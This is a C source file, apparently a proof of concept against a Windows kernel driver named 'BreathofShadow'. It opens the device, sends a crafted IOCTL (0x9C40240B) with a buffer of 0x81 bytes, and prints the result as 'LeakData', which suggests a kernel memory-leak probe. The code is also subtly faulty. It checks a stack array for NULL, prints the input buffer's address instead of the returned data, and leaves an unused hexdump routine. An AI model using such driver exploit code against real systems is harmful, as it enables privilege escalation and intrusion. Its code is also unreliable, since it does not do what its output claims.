#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DeVioctlCode 0x9C40240B
#define DeviceName L"\\\\.\\BreathofShadow"

void hexdump(const void* data, size_t size)
{
    const unsigned char* byteData = (const unsigned char*)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);

        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", byteData[i + j]);
            } else {
                printf("   ");
            }
        }

        printf(" |");
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                unsigned char c = byteData[i + j];
                if (c >= 32 && c <= 126) {
                    printf("%c", c);
                } else {
                    printf(".");
                }
            }
        }
        printf("|\n");
    }
}

int main()
{
    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
        return 1;
    }

    printf("[!] Success open device");

    char inputbuf[0x8];

    if (inputbuf == NULL) {
        printf("[X] Memory allocation failed\n");
        CloseHandle(hDevice);
        return 1;
    }

    memset(inputbuf, 0x81, 0x8);

    char outputbuf[0x8] = { 0 };
    
    DWORD bytesReturned = 0;

    BOOL result = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        inputbuf,
        0x8,
        outputbuf,
        0x8,
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("[*] IOCTL command sent successfully\n");
        printf("[!] LeakData: %llx\n",inputbuf);
    } else {
        printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
    }

    // free(inputbuf);
    // CloseHandle(hDevice);
    return 0;
}

